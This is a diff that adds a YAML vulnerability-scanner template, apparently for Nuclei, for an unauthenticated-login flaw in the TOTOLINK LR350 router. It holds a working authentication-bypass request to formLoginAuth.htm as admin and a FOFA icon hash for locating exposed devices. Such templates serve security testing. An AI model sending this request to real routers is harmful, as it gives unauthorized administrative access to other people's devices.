@@ -1,0 +1,21 @@
+id: poc-fcu0m9gfyd9ay4g5
+info:
+  name: TOTOLINK LR350 formAuthLogin未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fcu0m9gfyd9ay4g5'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fcu0m9gfyd9ay4g5
+    fofa: icon_hash="-1335251146"
+http:
+- raw:
+  - 'GET /formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
